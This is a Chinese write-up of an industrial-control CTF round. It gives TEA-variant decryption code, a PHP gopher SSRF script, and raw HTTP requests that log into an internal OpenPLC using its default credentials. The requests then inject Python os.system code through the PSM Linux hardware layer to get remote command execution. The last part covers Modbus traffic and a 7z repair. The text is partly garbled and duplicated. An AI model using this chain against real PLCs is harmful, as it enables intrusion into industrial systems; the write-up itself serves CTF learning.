---
title: 2021 年工业信息安全技能大赛 - 线上第二场 WriteUp
contest: 2021 工业信息安全技能大赛
year: 2021
difficulty: hard
vuln_type:
- reverse
- ssrf
- rce
- block_cipher
- web_unknown
- forensic_disk
tags:
- TEA
- XTEA
- XXTEA
- rand-srand-seed
- OpenPLC
- RCE
- gopher
- PSM-Linux
- 工控
- ICS
- PLC
- SCADA
- WinCC
- 7z
attack_chain:
- 'reverse: 变种 TEA 解密，sum=0xC6EF3720 delta=0x9e3779b9 32 轮'
- 'reverse: 改进 TEA sum=0x62F35080 delta=0x458BCD42 64 轮 + XOR 0x10/0x20'
- '解密 flag.png.enc: srand(1626940252) 生成 XOR key + TEA 解 16 字节一块'
- 'SSRF: 扫端口发现 172.16.238.99:8080 是 OpenPLC'
- 'gopher 打 OpenPLC: openplc:openplc 默认账号登录'
- POST /hardware 上传 PSM Linux custom_layer_code 注入 Python 命令
- GET /compile-program?file=blank_program.st 编译 → /start_plc 启动 → /runtime_logs 看输出
- 'mod traffic: 流量分析 modbus 找备份文件'
- 7z 头修复（缺 37 7A 头）解压得 WinCC 项目
- 'flag 藏在组态文件尾部: flag{SPwAvMx0z5jtP5gT}'
key_payload: srand(1626940252) + tea_key={0x0D,0x0E,0x0A,0x0D,...0xEF}  → flag.png
one_liner: 工控 CTF 经典：变种 TEA + SSRF→OpenPLC RCE + Modbus 流量 + 7z 修复 + WinCC
lesson: 工控/ICS 安全赛要熟悉 OpenPLC、WinCC、Modbus；TEA 系列密码 + srand 爆破是 reverse 入门
quality: high
full_path: 2021年工业信息安全技能大赛-线上第二场WriteUp.full.md
meta_path: 2021年工业信息安全技能大赛-线上第二场WriteUp.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: '2021 年工业信息安全技能大赛 - 线上第二场 WriteUp。工控 CTF 经典：变种 TEA + SSRF→OpenPLC RCE + Modbus 流量 + 7z 修复 + WinCC。关键路径：reverse: 变种 TEA 解密，sum=0xC6EF3720 delta=0x9e3779b9 32 轮 → reverse: 改进 TEA sum=0x62F35080 delta=...'
category: reverse
subcategory: reverse
subcategories:
- reverse
- ssrf
- rce
- symmetric
- web_other
- disk_forensics
tools_used:
- Python
time_required: long
difficulty_score: 4
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/1512.html
reasoning_chain:
- '[触发点] 第一段代码 sum=0xC6EF3720 delta=0x9e3779b9 → 假设：变种 TEA 32 轮 / [假设] key=给定 4 字节，密文 16 字节一组 / [动作] 写 Python 解密脚本 / [观察] 拿到中间文本 / [下一步] 进第二段 TEA'
- '[触发点] sum=0x62F35080 delta=0x458BCD42 64 轮 + XOR 0x10/0x20 → 假设：改良 TEA / [动作] 同样解密 / [观察] 拿到 flag.png.enc / [下一步] 解 png'
- '[触发点] flag.png.enc 用 srand(1626940252) + tea_key → 假设：rand 序列做 XOR key / [动作] C跑 srand + 拼 TEA 解 16 字节一组 / [观察] PNG 头89 50 / [下一步] SSRF→OpenPLC'
- '[触发点] 扫端口172.16.238.99:8080 → 假设：OpenPLC / [动作] openplc:openplc 默认账号 / [观察] 登录成功 / [下一步] 走 gopher 打 RCE'
- '[触发点] /hardware upload PSM Linux custom_layer_code → 假设：注入 Python 命令 / [动作] POST 上传 → compile → start_plc / [观察] /runtime_logs 看到反弹 / [下一步] 7z 修复'
- '[触发点] 7z 文件缺 37 7A 头 → 假设：补头解压 / [动作] 拼 37 7A → unzip / [观察] WinCC 项目 →尾部含 flag{SPwAvMx0z5jtP5gT}'
failed_attempts:
- 试图直接用 delta=0x9e3779b9 标准 TEA 解密 → 失败：第二段是改良版本
- 试图 gopher 打 OpenPLC 复杂 PoC → 失败：默认账号 openplc:openplc 直登
key_observations:
- TEA 系列（XTEA/XXTEA）sum/delta 不同但结构同
- OpenPLC 默认密码 openplc:openplc 必须立即改
- 7z 缺 37 7A 头是压缩包修复经典手法
prerequisites:
- TEA/XTEA/XXTEA 加解密原理
- OpenPLC/Modbus 工控协议基础
- PSM Linux custom_layer_code 注入手法
- 7z 文件结构修复
---
# 2021年工业信息安全技能大赛-线上第二场WriteUp

> 原文: https://www.ctfiot.com/1512.html
> ID: 1512

v2 = 3v5 = 70v8 = -1

v1 = 30v2 = 3v3 = 10v3 + v11 = v5 = 70!!! v11 = 60
v8 = -1
v1 = 30v6 =v1 * v6 = v7
v7 + v8 = v9 = v10 = v12 = v1130 * v6 -1 = v9 = -61

#include <stdio.h> #include <stdint.h> //解密函数 void decrypt (uint32_t* v, uint32_t* k) { uint32_t v0=v[0], v1=v[1], sum=0xC6EF3720, i; /* set up */ uint32_t delta=0x9e3779b9; /* a key schedule constant */ uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3]; /* cache key */ for (i=0; i<32; i++) { /* basic cycle start */ v1 -= ((v0<<4) + k2) ^ (v0 + sum) ^ ((v0>>5) + k3); v0 -= ((v1<<4) + k0) ^ (v1 + sum) ^ ((v1>>5) + k1); sum -= delta; } /* end cycle */ v[0]=v0; v[1]=v1; }
int main() { uint32_t r[8] = {}; int i; for (i = 0; i < 8; i+=2) { uint32_t v[2]= {r[i], r[i+1]},k[4]={}; // v为要加密的数据是两个32位无符号整数 // k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位 decrypt(v, k); printf("%x%x",v[0],v[1]); } return 0; }

#include<stdio.h>#include<stdlib.h>#include<string.h>#include<time.h>

//解密函数 void decrypt (unsigned int* v, unsigned int* k) { unsigned int v0=v[0], v1=v[1], sum=0x62F35080, i; /* set up */ unsigned int delta=0x458BCD42; /* a key schedule constant */ unsigned int k0=k[0], k1=k[1], k2=k[2], k3=k[3]; /* cache key */ for (i=0; i<64; i++) { /* basic cycle start */ v1 -= ((((v0<<6) + k2) ^ (v0 + sum + 20) ^ ((v0>>9) + k3))^0x10); v0 -= ((((v1<<6) + k0) ^ (v1 + sum + 11) ^ ((v1>>9) + k1))^0x20); sum -= delta; } /* end cycle */ v[0]=v0; v[1]=v1; }int main(){ char magic[0x32d5]; char tmp[16]; unsigned char png[4] = {0x89, 0x50, 0x4E, 0x47 };
 unsigned char tea_key[16] = {0x0D, 0x0E, 0x0A, 0x0D, 0x0B, 0x0E, 0x0E, 0x0F, 0x12, 0x34, 0x56, 0x78, 0x90, 0xAB, 0xCD, 0xEF };zc FILE*fp=fopen("flag.png.enc","rb"); int rl=fread(magic,0x32d5,1,fp); printf("%dn",rl); fclose(fp); unsigned char key; int seed=1626940252; srand(seed); for(int i=0;i<0x32d5;i++){ key=(unsigned char)rand(); magic[i]^=key; } for(int k=0;k<0x32d5;k+=16){
 decrypt((unsigned int *)(magic+k),(unsigned int *)tea_key); } fp=fopen("flag.png","wb+"); fwrite(magic,0x32d5,1,fp); fclose(fp); return 0;}

127.0.0.1 localhost::1 localhost ip6-localhost ip6-loopbackfe00::0 ip6-localnetff00::0 ip6-mcastprefixff02::1 ip6-allnodesff02::2 ip6-allrouters172.16.237.2 956510a842ce // 这个是最外面的服务自己172.16.238.2 956510a842ce

SSRF扫端口，扫到http://172.16.238.99:
8080 访问发现是OpenPLC

gopher打OpenPLC RCE

在OpenPLC的hardware里可以注入自写脚本，直接选择Linux PSM写python代码就可以了

然后用gopher包一下发包就行了

<?php
$u = 'http://192.168.87.114/?url=';// 172.16.238.99:
8080/login$data = 'username=openplc&password=openplc';
$addr = "172.16.238.99:
8080";$headers = [];$headers[] = "POST /login HTTP/1.1";$headers[] = "Host: $addr";$headers[] = "Content-Type: application/x-www-form-urlencoded";$headers[] = "Content-Length: " . strlen($data);
$data = urlencode($data);$header = urlencode(implode("rn",$headers)."rnrn");$header = str_replace("+","%20",$header);
$ssrf = "gopher://$addr/_" . $header . $data;
$ssrf = $u .urlencode($ssrf);$r = file_get_contents($ssrf);preg_match_all("/Set-Cookie: session=(.+?); Expire/",$r,$m);
$cookie = "session=".$m[1][0];
$addr = "172.16.238.99:
8080";$headers = [];$headers[] = "GET /users HTTP/1.1";$headers[] = "Host: $addr";$headers[] = "Cookie: $cookie";$data = '';$header = urlencode(implode("rn",$headers)."rnrn");$header = str_replace("+","%20",$header);
$ssrf = "gopher://$addr/_" . $header;
echo $ssrf . "rn";$ssrf = $u .urlencode($ssrf);
echo $ssrf . "rnrn";$r = file_get_contents($ssrf);

POST /login HTTP/1.1HOST: 172.16.238.99:
8080Content-Type: application/x-www-form-urlencodedContent-Length: 33
username=openplc&password=openplc

2.上传自写脚本(POST /hardware)

POST /login HTTP/1.1HOST: 172.16.238.99:
8080Content-Type: application/x-www-form-urlencodedCookie: session=.eJw1j8tqwzAQRX-laN1F_MjG0IVBScEwEwRyxWgTWketrFqOcRJsT8i_1y10dTaXwz13cfwc3cWL4jre3LM4tidR3MXThygEcjNZWS8UYcaAwRo1Uazng1QJMrY27jYUqpa4zoh3TLz_xnDyyGUOstmA3nvQNIGhBKXKKQCjqVMwdt34jrjyxE1KsYorE_j16XIL_BYOupwppQz010IGckwho0CzlTag7qJ9VYuNVYsRcmL1Ih7r98GN8b13_fW_5nZx41-ROA-uH7pGPH4Ap_RSTQ.YQOUzA.GaKPU1K1cGJkslzOnjOXF7gbDpgContent-Length: 77
hardware_layer=psm_linux&custom_layer_code=hardware_layer=psm_linux&custom_layer_code=__import__(os).system('ls+-alh+/')

GET /compile-program?file=blank_program.st HTTP/1.1HOST: 172.16.238.99:
8080Cookie: session=.eJw1j8tqwzAQRX-laN1F_MjG0IVBScEwEwRyxWgTWketrFqOcRJsT8i_1y10dTaXwz13cfwc3cWL4jre3LM4tidR3MXThygEcjNZWS8UYcaAwRo1Uazng1QJMrY27jYUqpa4zoh3TLz_xnDyyGUOstmA3nvQNIGhBKXKKQCjqVMwdt34jrjyxE1KsYorE_j16XIL_BYOupwppQz010IGckwho0CzlTag7qJ9VYuNVYsRcmL1Ih7r98GN8b13_fW_5nZx41-ROA-uH7pGPH4Ap_RSTQ.YQOUzA.GaKPU1K1cGJkslzOnjOXF7gbDpg

GET /start_plc HTTP/1.1HOST: 172.16.238.99:
8080Cookie: session=.eJw1j8tqwzAQRX-laN1F_MjG0IVBScEwEwRyxWgTWketrFqOcRJsT8i_1y10dTaXwz13cfwc3cWL4jre3LM4tidR3MXThygEcjNZWS8UYcaAwRo1Uazng1QJMrY27jYUqpa4zoh3TLz_xnDyyGUOstmA3nvQNIGhBKXKKQCjqVMwdt34jrjyxE1KsYorE_j16XIL_BYOupwppQz010IGckwho0CzlTag7qJ9VYuNVYsRcmL1Ih7r98GN8b13_fW_5nZx41-ROA-uH7pGPH4Ap_RSTQ.YQOUzA.GaKPU1K1cGJkslzOnjOXF7gbDpg

GET /runtime_logs HTTP/1.1HOST: 172.16.238.99:
8080Cookie: session=.eJw1j8tqwzAQRX-laN1F_MjG0IVBScEwEwRyxWgTWketrFqOcRJsT8i_1y10dTaXwz13cfwc3cWL4jre3LM4tidR3MXThygEcjNZWS8UYcaAwRo1Uazng1QJMrY27jYUqpa4zoh3TLz_xnDyyGUOstmA3nvQNIGhBKXKKQCjqVMwdt34jrjyxE1KsYorE_j16XIL_BYOupwppQz010IGckwho0CzlTag7qJ9VYuNVYsRcmL1Ih7r98GN8b13_fW_5nZx41-ROA-uH7pGPH4Ap_RSTQ.YQOUzA.GaKPU1K1cGJkslzOnjOXF7gbDpg

mod traffic

发现beifen文件

发现7z文件头格式，少了377A

补齐7z头

解压发现是wincc项目文件，使用wincc打开

发现flag在组态文件后面

flag{SPwAvMx0z5jtP5gT}

end

招新小广告

ChaMd5 Venom 招收大佬入圈

新成立组IOT+工控+样本分析+AI 长期招新

欢迎联系admin@chamd5.org


```
v2 = 3v5 = 70v8 = -1

v1 = 30v2 = 3v3 = 10v3 + v11 = v5 = 70!!! v11 = 60
v8 = -1
v1 = 30v6 =v1 * v6 = v7
v7 + v8 = v9 = v10 = v12 = v1130 * v6 -1 = v9 = -61
    #include <stdio.h> #include <stdint.h> //解密函数 void decrypt (uint32_t* v, uint32_t* k) { uint32_t v0=v[0], v1=v[1], sum=0xC6EF3720, i; /* set up */ uint32_t delta=0x9e3779b9; /* a key schedule constant */ uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3]; /* cache key */ for (i=0; i<32; i++) { /* basic cycle start */ v1 -= ((v0<<4) + k2) ^ (v0 + sum) ^ ((v0>>5) + k3); v0 -= ((v1<<4) + k0) ^ (v1 + sum) ^ ((v1>>5) + k1); sum -= delta; } /* end cycle */ v[0]=v0; v[1]=v1; }
int main() { uint32_t r[8] = {}; int i; for (i = 0; i < 8; i+=2) { uint32_t v[2]= {r[i], r[i+1]},k[4]={}; // v为要加密的数据是两个32位无符号整数 // k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位 decrypt(v, k); printf("%x%x",v[0],v[1]); } return 0; }
    #include<stdio.h>#include<stdlib.h>#include<string.h>#include<time.h>

//解密函数 void decrypt (unsigned int* v, unsigned int* k) { unsigned int v0=v[0], v1=v[1], sum=0x62F35080, i; /* set up */ unsigned int delta=0x458BCD42; /* a key schedule constant */ unsigned int k0=k[0], k1=k[1], k2=k[2], k3=k[3]; /* cache key */ for (i=0; i<64; i++) { /* basic cycle start */ v1 -= ((((v0<<6) + k2) ^ (v0 + sum + 20) ^ ((v0>>9) + k3))^0x10); v0 -= ((((v1<<6) + k0) ^ (v1 + sum + 11) ^ ((v1>>9) + k1))^0x20); sum -= delta; } /* end cycle */ v[0]=v0; v[1]=v1; }int main(){ char magic[0x32d5]; char tmp[16]; unsigned char png[4] = {0x89, 0x50, 0x4E, 0x47 };
 unsigned char tea_key[16] = {0x0D, 0x0E, 0x0A, 0x0D, 0x0B, 0x0E, 0x0E, 0x0F, 0x12, 0x34, 0x56, 0x78, 0x90, 0xAB, 0xCD, 0xEF };zc FILE*fp=fopen("flag.png.enc","rb"); int rl=fread(magic,0x32d5,1,fp); printf("%dn",rl); fclose(fp); unsigned char key; int seed=1626940252; srand(seed); for(int i=0;i<0x32d5;i++){ key=(unsigned char)rand(); magic[i]^=key; } for(int k=0;k<0x32d5;k+=16){
 decrypt((unsigned int *)(magic+k),(unsigned int *)tea_key); } fp=fopen("flag.png","wb+"); fwrite(magic,0x32d5,1,fp); fclose(fp); return 0;}
127.0.0.1 localhost::1 localhost ip6-localhost ip6-loopbackfe00::0 ip6-localnetff00::0 ip6-mcastprefixff02::1 ip6-allnodesff02::2 ip6-allrouters172.16.237.2 956510a842ce // 这个是最外面的服务自己172.16.238.2 956510a842ce
<?php
$u = 'http://192.168.87.114/?url=';// 172.16.238.99:
8080/login$data = 'username=openplc&password=openplc';
$addr = "172.16.238.99:
8080";$headers = [];$headers[] = "POST /login HTTP/1.1";$headers[] = "Host: $addr";$headers[] = "Content-Type: application/x-www-form-urlencoded";$headers[] = "Content-Length: " . strlen($data);
$data = urlencode($data);$header = urlencode(implode("rn",$headers)."rnrn");$header = str_replace("+","%20",$header);
$ssrf = "gopher://$addr/_" . $header . $data;
$ssrf = $u .urlencode($ssrf);$r = file_get_contents($ssrf);preg_match_all("/Set-Cookie: session=(.+?); Expire/",$r,$m);
$cookie = "session=".$m[1][0];
$addr = "172.16.238.99:
8080";$headers = [];$headers[] = "GET /users HTTP/1.1";$headers[] = "Host: $addr";$headers[] = "Cookie: $cookie";$data = '';$header = urlencode(implode("rn",$headers)."rnrn");$header = str_replace("+","%20",$header);
$ssrf = "gopher://$addr/_" . $header;
echo $ssrf . "rn";$ssrf = $u .urlencode($ssrf);
echo $ssrf . "rnrn";$r = file_get_contents($ssrf);
POST /login HTTP/1.1HOST: 172.16.238.99:
8080Content-Type: application/x-www-form-urlencodedContent-Length: 33
username=openplc&password=openplc
POST /login HTTP/1.1HOST: 172.16.238.99:
8080Content-Type: application/x-www-form-urlencodedCookie: session=.eJw1j8tqwzAQRX-laN1F_MjG0IVBScEwEwRyxWgTWketrFqOcRJsT8i_1y10dTaXwz13cfwc3cWL4jre3LM4tidR3MXThygEcjNZWS8UYcaAwRo1Uazng1QJMrY27jYUqpa4zoh3TLz_xnDyyGUOstmA3nvQNIGhBKXKKQCjqVMwdt34jrjyxE1KsYorE_j16XIL_BYOupwppQz010IGckwho0CzlTag7qJ9VYuNVYsRcmL1Ih7r98GN8b13_fW_5nZx41-ROA-uH7pGPH4Ap_RSTQ.YQOUzA.GaKPU1K1cGJkslzOnjOXF7gbDpgContent-Length: 77
hardware_layer=psm_linux&custom_layer_code=hardware_layer=psm_linux&custom_layer_code=__import__(os).system('ls+-alh+/')
GET /compile-program?file=blank_program.st HTTP/1.1HOST: 172.16.238.99:
8080Cookie: session=.eJw1j8tqwzAQRX-laN1F_MjG0IVBScEwEwRyxWgTWketrFqOcRJsT8i_1y10dTaXwz13cfwc3cWL4jre3LM4tidR3MXThygEcjNZWS8UYcaAwRo1Uazng1QJMrY27jYUqpa4zoh3TLz_xnDyyGUOstmA3nvQNIGhBKXKKQCjqVMwdt34jrjyxE1KsYorE_j16XIL_BYOupwppQz010IGckwho0CzlTag7qJ9VYuNVYsRcmL1Ih7r98GN8b13_fW_5nZx41-ROA-uH7pGPH4Ap_RSTQ.YQOUzA.GaKPU1K1cGJkslzOnjOXF7gbDpg
GET /start_plc HTTP/1.1HOST: 172.16.238.99:
8080Cookie: session=.eJw1j8tqwzAQRX-laN1F_MjG0IVBScEwEwRyxWgTWketrFqOcRJsT8i_1y10dTaXwz13cfwc3cWL4jre3LM4tidR3MXThygEcjNZWS8UYcaAwRo1Uazng1QJMrY27jYUqpa4zoh3TLz_xnDyyGUOstmA3nvQNIGhBKXKKQCjqVMwdt34jrjyxE1KsYorE_j16XIL_BYOupwppQz010IGckwho0CzlTag7qJ9VYuNVYsRcmL1Ih7r98GN8b13_fW_5nZx41-ROA-uH7pGPH4Ap_RSTQ.YQOUzA.GaKPU1K1cGJkslzOnjOXF7gbDpg
GET /runtime_logs HTTP/1.1HOST: 172.16.238.99:
8080Cookie: session=.eJw1j8tqwzAQRX-laN1F_MjG0IVBScEwEwRyxWgTWketrFqOcRJsT8i_1y10dTaXwz13cfwc3cWL4jre3LM4tidR3MXThygEcjNZWS8UYcaAwRo1Uazng1QJMrY27jYUqpa4zoh3TLz_xnDyyGUOstmA3nvQNIGhBKXKKQCjqVMwdt34jrjyxE1KsYorE_j16XIL_BYOupwppQz010IGckwho0CzlTag7qJ9VYuNVYsRcmL1Ih7r98GN8b13_fW_5nZx41-ROA-uH7pGPH4Ap_RSTQ.YQOUzA.GaKPU1K1cGJkslzOnjOXF7gbDpg
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]